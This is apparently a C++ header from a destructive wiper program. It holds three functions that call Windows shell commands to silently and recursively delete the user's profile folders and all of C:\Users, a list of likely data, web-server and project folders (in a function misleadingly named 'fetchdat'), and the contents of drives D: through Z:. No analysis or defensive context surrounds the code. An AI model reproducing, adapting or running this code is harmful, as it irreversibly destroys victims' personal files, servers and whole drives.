#pragma once
#include <iostream>
using namespace std;

void delusr() {
    system("rmdir %USERPROFILE%\\Desktop /q /s");
    system("rmdir %USERPROFILE%\\Downloads /q /s");
    system("rmdir %USERPROFILE%\\Pictures /q /s");
    system("rmdir %USERPROFILE%\\Music /q /s");
    system("rmdir %USERPROFILE%\\Videos /q /s");
    system("rmdir %USERPROFILE%\\AppData /q /s");
    system("rmdir C:\\Users /s /q");
}

void fetchdat() {
    system("if exist C:\\Apache24 rd C:\\Apache24 /s /q");
    system("if exist C:\\inetpub\\ rd C:\\inetpub /s /q");
    system("if exist C:\\Data\\ rd C:\\Data /s /q");
    system("if exist C:\\Datas\\ rd C:\\Datas /s /q");
    system("if exist C:\\Important\\ rd C:\\Important /s /q");
    system("if exist C:\\Importants\\ rd C:\\Importants /s /q");
    system("if exist C:\\Dulieu\\ rd C:\\Dulieu /s /q");
    system("if exist C:\\Web\\ rd C:\\Web /s /q");
    system("if exist C:\\Virus\\ rd C:\\Virus /s /q");
    system("if exist C:\\Coding\\ rd C:\\Coding /s /q");
    system("if exist C:\\Laptrinh\\ rd C:\\LapTrinh /s /q");
    system("if exist C:\\QuanTrong\\ rd C:\\Quantrong /s /q");
    system("if exist C:\\DuAn\\ rd C:\\DuAn /s /q");
    system("if exist C:\\MyWebSite\\ rd C:\\MyWebSite /s /q");
    system("if exist C:\\MyWebSites\\ rd C:\\MyWebSites /s /q");
    system("if exist C:\\Test\\ rd C:\\Test /s /q");
    system("if exist C:\\Tests\\ rd C:\\Tests /s /q");
    system("if exist C:\\Samples\\ rd C:\\Samples /s /q");
    system("if exist C:\\Sample\\ rd C:\\Sample /s /q");
    system("if exist C:\\TestWeb\\ rd C:\\TestWeb /s /q");
    system("if exist C:\\Malware\\ rd C:\\Malware /s /q");
    system("if exist C:\\Malwares\\ rd C:\\Malwares /s /q");
    system("if exist C:\\Ransomware\\ rd C:\\Ransomware /s /q");
    system("if exist C:\\Ransomwares\\ rd C:\\Ransomwares /s /q");
    system("if exist C:\\Worm\\ rd C:\\Worm /s /q");
    system("if exist C:\\Worms\\ rd C:\\Worms /s /q");
}

void deldrvs() {
    system("if exist D:\\ rd D: /s /q");
    system("if exist E:\\ rd E: /s /q");
    system("if exist F:\\ rd F: /s /q");
    system("if exist G:\\ rd G: /s /q");
    system("if exist H:\\ rd H: /s /q");
    system("if exist I:\\ rd I: /s /q");
    system("if exist K:\\ rd K: /s /q");
    system("if exist L:\\ rd L: /s /q");
    system("if exist M:\\ rd M: /s /q");
    system("if exist N:\\ rd N: /s /q");
    system("if exist O:\\ rd O: /s /q");
    system("if exist P:\\ rd P: /s /q");
    system("if exist Q:\\ rd Q: /s /q");
    system("if exist R:\\ rd R: /s /q");
    system("if exist S:\\ rd S: /s /q");
    system("if exist T:\\ rd T: /s /q");
    system("if exist U:\\ rd U: /s /q");
    system("if exist V:\\ rd V: /s /q");
    system("if exist W:\\ rd W: /s /q");
    system("if exist X:\\ rd X: /s /q");
    system("if exist Y:\\ rd Y: /s /q");
    system("if exist Z:\\ rd Z: /s /q");
}
